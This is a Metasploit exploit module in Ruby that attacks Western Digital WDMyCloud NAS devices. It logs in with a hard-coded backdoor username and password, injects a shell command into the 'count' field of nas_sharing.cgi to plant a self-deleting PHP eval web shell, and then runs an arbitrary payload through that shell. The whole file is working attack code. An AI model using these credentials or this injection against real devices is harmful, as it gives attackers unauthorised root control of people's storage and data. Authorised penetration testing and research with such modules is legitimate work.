# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Western Digital WDMyCloud 'mydlinkBRionyg' Backdoor",
      'Description'    => %q{
        This module exploits two issues. The first issue is that there is a hard 
        coded backdoor within WDMyCloud devices. Using this backdoor access we 
        can then reach buggy code which is vulnerable to command injection. A
        root shell will be spawned upon successful exploitation.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Bercegay', # Vulnerability Discovery
        ],
      'References'     =>
        [
          [ 'URL', 'https://gulftech.org/' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['Automatic', {}] ],
      'DisclosureDate' => '2018-01-03',
      'DefaultTarget'  => 0))
  end

  def check
      
      # system file and checking if the response code is 200.
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/cgi-bin/nas_sharing.cgi",
        'vars_post' => {
          'cmd' => 7,
          'user' => "mydlinkBRionyg",
          'passwd' => Rex::Text.encode_base64("abc12345cba"),
          'path' => Rex::Text.encode_base64("/mnt/HD_a4/.!@#")
        }
      })

    if res and res.code == 200
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    # Make things a bit less obvious ...
    rnd = Rex::Text.rand_text_hex(rand(10) + 5)
    idx = rand(1000)

    print_status("Creating payload wrapper #{rnd}.php")

      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/cgi-bin/nas_sharing.cgi",
        'vars_post' => {
          'cmd' => 51,
          'user' => "mydlinkBRionyg",
          'passwd' => Rex::Text.encode_base64("abc12345cba"),
          'start' => "1",
          'count' => "1;echo '<?php unlink(__FILE__);@eval($_REQUEST[#{idx}]);'>/var/www/#{rnd}.php;echo 1"
        }
      })

    # We know the system supports PHP by default, so we go with a PHP payload
    print_status("Executing the selected payload via $_POST[#{idx}]")

      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => "/#{rnd}.php",
        'vars_post' => {
          idx => payload.encoded
        }
      })
    
    end
end

